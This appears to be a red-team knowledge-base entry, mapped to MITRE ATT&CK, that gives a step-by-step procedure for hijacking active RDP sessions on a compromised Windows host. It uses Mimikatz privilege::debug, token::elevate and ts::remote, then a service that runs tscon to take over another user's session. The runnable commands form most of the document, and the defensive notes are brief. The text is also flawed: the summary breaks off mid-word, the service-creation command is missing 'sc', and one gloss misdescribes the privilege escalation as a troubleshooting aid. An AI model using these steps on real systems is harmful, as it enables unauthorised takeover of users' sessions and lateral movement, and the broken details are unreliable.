---
id: 511843e1-8a56-4f65-b642-7e6fbd36b85d
name: RDP Session Takeover with Mimikatz
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:27.389201+00:00'
updated_at: '2023-04-10T20:37:19.860616+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
- '[[Remote Service Session Hijacking|T1563 - Remote Service Session Hijacking]]'
sub_techniques:
- '[[RDP Hijacking|T1563.002 - RDP Hijacking]]'
tags:
- '[[RDP Session Takeover]]'
- '[[Windows - Mimikatz]]'
commands:
- '[[Connect to Remote Server with ID 2]]'
- '[[Create Session Hijack]]'
- '[[Debug Privilege Elevated]]'
- '[[List active sessions]]'
- '[[Query Session ID]]'
- '[[Start Session Hijack]]'
---

# RDP Session Takeover with Mimikatz

## Summary

RDP Session Takeover with Mimikatz is a technique used by attackers to hijack active RDP sessions on a compromised Windows host. This technique involves using Mimikatz to dump credentials from the memory of the compromised host and using those credentials to take over an active RDP session. By doin

## Description

# Description

RDP Session Takeover with Mimikatz is a technique used by attackers to hijack active RDP sessions on a compromised Windows host. This technique involves using Mimikatz to dump credentials from the memory of the compromised host and using those credentials to take over an active RDP session. By doing so, attackers can gain access to sensitive data and systems that are only accessible through that session.

Technical Explanation: Attackers can use Mimikatz to dump credentials from the memory of a compromised Windows host. Once they have the credentials, they can use them to take over an active RDP session. Attackers can then use the compromised session to move laterally within the network and gain access to sensitive data and systems that are only accessible through that session.

Business Value: Attackers can use this technique to gain access to sensitive data and systems that are only accessible through a compromised RDP session. This can lead to data theft, system compromise, and financial loss for the targeted organization.

## Requirements

1. Access to a compromised Windows host

1. Mimikatz tool

## Defense

1. Implement two-factor authentication for RDP sessions

1. Monitor RDP sessions for suspicious activity

1. Restrict network access to only authorized users and systems

## Objectives

1. Take over an active RDP session on a compromised Windows host

1. Gain access to sensitive data and systems that are only accessible through the compromised session

1. Move laterally within the network

# Instructions

1. To enable debug privileges, run the following command:

**Code**: [[privilege::debug 
token::elevate ]]

> This command grants the process the ability to debug other processes and access their memory. The privilege::debug argument specifies the debug privilege and token::elevate argument elevates the process token to allow the privilege to be enabled. This command is useful for troubleshooting and debugging applications.

**Command** ([[Debug Privilege Elevated]]):

```bash
privilege::debug 
token::elevate
```

2. Use the ts::sessions command to list all Remote Desktop Protocol (RDP) sessions currently active on the system.

**Code**: [[ts::sessions]]

> This command provides information about each RDP session, including the session ID, user name, session state, and client name. It is useful for monitoring active RDP sessions and troubleshooting issues related to remote access.

**Command** ([[List active sessions]]):

```bash
ts::sessions
```

3. This command is used to hijack a remote session on a Windows system. The /id argument specifies the ID of the session that you want to hijack.

**Code**: [[ts::remote /id:2]]

> Remote session hijacking can be used by attackers to take control of a user's session on a remote system. This can be done by exploiting vulnerabilities in the Remote Desktop Protocol (RDP) or by stealing session tokens. It is important to use this command ethically and only in controlled environments for testing purposes.

**Command** ([[Connect to Remote Server with ID 2]]):

```bash
ts::remote /id:2
```

4. tscon.exe is a command line utility that can be used to connect to a remote desktop session on a terminal server.

**Code**: [[tscon.exe]]

> To use tscon.exe, you will need to provide the session ID of the remote desktop session you want to connect to. The session ID can be obtained using the 'query session' command. The syntax for the tscon.exe command is as follows:

 tscon.exe [session ID] [/dest:sessionname] [/password:password] [/v]

- [session ID]: The ID of the remote desktop session you want to connect to.
- [/dest:sessionname]: Specifies the name of the session to which you want to connect.
- [/password:password]: Specifies the password for the user account that is used to connect to the remote desktop session.
- [/v]: Verbose mode. Displays detailed information about the connection process.

5. To hijack a session, follow the below instructions:
1. Run the 'query user' command to get the Session ID you want to hijack.
2. Run the 'create sesshijack binpath="cmd.exe /k tscon 1 /dest:rdp-tcp#55"' command to create a sesshijack service with the specified binary path and Session ID.
3. Run the 'net start sesshijack' command to start the sesshijack service.

**Code**: [[# get the Session ID you want to hijack
query user]]

> The 'query user' command is used to get a list of user sessions on a remote server. The 'create sesshijack' command is used to create a new service named 'sesshijack' with the specified binary path and Session ID to hijack. The 'net start sesshijack' command is used to start the sesshijack service and hijack the specified Session ID.

**Command** ([[Query Session ID]]):

```bash
query user
```

**Command** ([[Create Session Hijack]]):

```bash
create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
```

**Command** ([[Start Session Hijack]]):

```bash
net start sesshijack
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]
- [[Remote Service Session Hijacking|T1563 - Remote Service Session Hijacking]]

### Sub-Techniques

- [[RDP Hijacking|T1563.002 - RDP Hijacking]]

## Commands Used

- [[Connect to Remote Server with ID 2]]
- [[Create Session Hijack]]
- [[Debug Privilege Elevated]]
- [[List active sessions]]
- [[Query Session ID]]
- [[Start Session Hijack]]

## Tags

- [[RDP Session Takeover]]
- [[Windows - Mimikatz]]
